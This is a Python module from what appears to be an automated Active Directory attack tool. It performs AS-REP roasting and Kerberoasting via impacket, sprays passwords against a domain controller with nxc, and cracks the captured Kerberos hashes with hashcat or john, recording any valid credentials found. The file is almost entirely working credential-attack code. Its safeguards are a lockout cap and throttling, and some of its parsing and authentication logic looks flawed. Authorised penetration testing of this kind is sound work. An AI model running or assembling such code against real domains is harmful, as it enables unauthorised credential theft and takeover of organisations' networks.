"""Credential attacks: AS-REP roasting, Kerberoasting, spraying, cracking.

SAFETY: password spraying is strictly lockout-aware. It reads the lockout
threshold (discovered during enumeration) and throttles accordingly, and by
default uses only a tiny safe password list (one password sprayed across all
users at a time — never many passwords against one account).
"""
from __future__ import annotations

import time
from pathlib import Path

from .base import BaseModule


class CredentialAttackModule(BaseModule):
    name = "credential_attacks"
    description = "AS-REP roast, Kerberoast, safe password spray, hash cracking"

    def run(self, workdir: Path) -> dict:
        auth = self._pick_auth()
        domain = self.state.domain

        self._asrep_roast(workdir, domain)
        self._kerberoast(workdir, domain, auth)
        self._password_spray(workdir, domain)
        self._crack(workdir)

        return {"credentials_found": len(self.state.usable_credentials())}

    def _pick_auth(self):
        creds = self.state.usable_credentials()
        if not creds:
            return None
        c = creds[0]
        return (c.domain or self.state.domain, c.username, c.password, c.nthash)

    def _dc(self) -> str | None:
        dcs = self.state.domain_controllers
        if dcs:
            return dcs[0]
        for ip, h in self.state.hosts.items():
            if h.is_dc:
                return ip
        return None

    # ------------------------------------------------------------------
    def _asrep_roast(self, workdir: Path, domain: str | None) -> None:
        """Request TGTs for accounts without pre-authentication."""
        dc = self._dc()
        if not dc:
            return
        user_file = self.state.meta.get("user_list_file")
        if not user_file or not Path(user_file).exists():
            self.log.debug("no user list; skipping AS-REP roast")
            return

        out = workdir / "asreproast_hashes.txt"
        cmd = self.runner.resolve("GetNPUsers", prefix="impacket-")
        args = [cmd, f"{domain or ''}/", "-usersfile", user_file,
                "-dc-ip", dc, "-format", "hashcat", "-outputfile", str(out)]
        res = self.runner.run(args, timeout=600, silent=True)
        hashes = _read_hashes(out, "$krb5asrep$")
        for h in hashes:
            user = h.split("$")[3] if len(h.split("$")) > 3 else "unknown"
            self.log_finding(
                "high", "AS-REP roastable account",
                f"{user} does not require Kerberos pre-authentication",
                technique="AS-REP Roasting")
        if hashes:
            self.state.meta["asrep_hashes_file"] = str(out)

    # ------------------------------------------------------------------
    def _kerberoast(self, workdir: Path, domain: str | None, auth) -> None:
        dc = self._dc()
        if not dc or not auth:
            return
        d, u, p, nth = auth
        out = workdir / "kerberoast_hashes.txt"
        cmd = self.runner.resolve("GetUserSPNs", prefix="impacket-")
        cred = f"{d}/{u}"
        args = [cmd, cred, "-dc-ip", dc, "-request",
                "-outputfile", str(out)]
        if nth:
            args += ["-hashes", f"0x0:{nth}"]
        else:
            args += ["-no-pass"]
        res = self.runner.run(args, timeout=600, silent=True)
        hashes = _read_hashes(out, "$krb5tgs$")
        for h in hashes:
            spn = h.split("$")[3] if len(h.split("$")) > 3 else "unknown"
            self.log_finding(
                "high", "Kerberoastable service ticket",
                f"TGS obtained for {spn}",
                technique="Kerberoasting")
        if hashes:
            self.state.meta["kerberoast_hashes_file"] = str(out)

    # ------------------------------------------------------------------
    def _password_spray(self, workdir: Path, domain: str | None) -> None:
        if not self.config.get("safety.password_spray.enabled", True):
            return
        dc = self._dc()
        if not dc:
            return
        user_file = self.state.meta.get("user_list_file")
        if not user_file or not Path(user_file).exists():
            return
        users = Path(user_file).read_text(encoding="utf-8").splitlines()

        # Lockout awareness
        lockout = self.state.meta.get("lockout_threshold")
        if lockout and int(lockout) <= 0:
            self.log.warn("account lockout threshold is 0 (no lockout); "
                          "spraying is safe but noisy")

        passwords = self.config.get("safety.password_spray.safe_passwords", [])
        if not passwords:
            return
        # Hard cap to remain lockout-aware regardless of config
        max_attempts = self.config.get("safety.password_spray.max_attempts_per_account", 3)
        passwords = passwords[:max_attempts]

        self.log.info("spraying %d password(s) across %d user(s)",
                      len(passwords), len(users))
        tmp_users = workdir / "users_spray.txt"
        tmp_users.write_text("\n".join(users), encoding="utf-8")

        for pw in passwords:
            if self.state.domain_admin_achieved:
                break
            res = self.runner.run(
                [self.nxc_bin(), "smb", dc, "-u", str(tmp_users), "-p", pw,
                 "--no-bruteforce", "--continue-on-success"],
                timeout=600, silent=True)
            for line in res.out_lines:
                # success marker: "[+]" or "Pwn3d!" or (Pwn3d)
                if "[+]" in line or "Pwn3d" in line:
                    m = _parse_nxc_success(line)
                    if m:
                        user = m[0]
                        self.state.add_credential(
                            username=user, password=pw, domain=domain,
                            source="password-spray")
                        self.log.ok("valid creds: %s\\%s:%s", domain, user, pw)
                        self.log_finding(
                            "critical", "Valid credentials from spray",
                            f"{domain}\\{user} : {pw}",
                            technique="Password Spray")
            # Throttle + jitter between sprays to reduce lockout/noise
            self.auth_delay()

    # ------------------------------------------------------------------
    def _crack(self, workdir: Path) -> None:
        if not self.config.get("credential_handling.crack_hashes", True):
            return
        wordlists = self.config.get("credential_handling.wordlists", [])
        wordlists = [w for w in wordlists if Path(w).exists()]
        if not wordlists:
            return

        cracker = self.config.get("credential_handling.cracker", "hashcat")
        modes = self.config.get("credential_handling.hashcat_modes", {})

        jobs = [
            (self.state.meta.get("asrep_hashes_file"), modes.get("asrep", 18200)),
            (self.state.meta.get("kerberoast_hashes_file"), modes.get("kerberoast", 13100)),
        ]
        for hash_file, mode in jobs:
            if not hash_file or not Path(hash_file).exists():
                continue
            self.log.info("cracking hashes from %s (mode %s)", Path(hash_file).name, mode)
            for wl in wordlists:
                if self.state.domain_admin_achieved:
                    break
                res = self._run_crack(cracker, mode, hash_file, wl, workdir)
                for user, pwd in _parse_cracked(res):
                    self.state.add_credential(
                        username=user, password=pwd, domain=self.state.domain,
                        source="cracked")
                    self.log.ok("cracked: %s : %s", user, pwd)
                    self.log_finding(
                        "critical", "Cracked credential",
                        f"{user} : {pwd}",
                        technique="Hash Cracking")

    def _run_crack(self, cracker: str, mode: int, hash_file: str,
                   wordlist: str, workdir: Path):
        pot = workdir / f"pot_{mode}.txt"
        if cracker == "hashcat":
            return self.runner.run(
                ["hashcat", "-m", str(mode), "-a", "0", hash_file, wordlist,
                 "--potfile-path", str(pot), "--quiet", "--force"],
                timeout=900, silent=True)
        # john fallback
        return self.runner.run(
            ["john", f"--format={_john_fmt(mode)}", f"--wordlist={wordlist}",
             hash_file],
            timeout=900, silent=True)


# ----------------------------------------------------------------------
def _read_hashes(path: Path, prefix: str) -> list[str]:
    if not path.exists():
        return []
    return [ln.strip() for ln in path.read_text(encoding="utf-8").splitlines()
            if ln.strip().startswith(prefix)]


def _parse_nxc_success(line: str) -> tuple[str, ...] | None:
    """Parse a successful nxc SMB line into (username,)."""
    parts = line.split()
    # Format: "SMB  10.10.10.1  445  DC  [+] DOMAIN\user:password"
    for i, p in enumerate(parts):
        if p in ("[+]", "(Pwn3d!)") and i + 1 < len(parts):
            cred = parts[i + 1]
            if "\\" in cred:
                return (cred.split("\\", 1)[1].split(":")[0],)
            if ":" in cred:
                return (cred.split(":")[0],)
    return None


def _parse_cracked(res) -> list[tuple[str, str]]:
    """Parse hashcat/john output into (username, password) pairs."""
    found = []
    text = res.stdout
    for line in text.splitlines():
        # hashcat: "hash:password" or "$krb5...$user:password" style with --show
        if ":" in line and not line.startswith("Session"):
            # For john: "password:user" order differs; handle both heuristically
            lhs, rhs = line.split(":", 1)
            # Determine which side looks like a username vs password
            if "$" in lhs and ":" in rhs:
                # hash:password
                user = lhs.split("$")[3] if lhs.startswith("$krb5") else "unknown"
                found.append((user, rhs))
            else:
                found.append((rhs if "@" not in rhs else rhs, lhs))
    return found


def _john_fmt(mode: int) -> str:
    return {18200: "krb5asrep", 13100: "krb5tgs", 1000: "nt"}.get(mode, "nt")
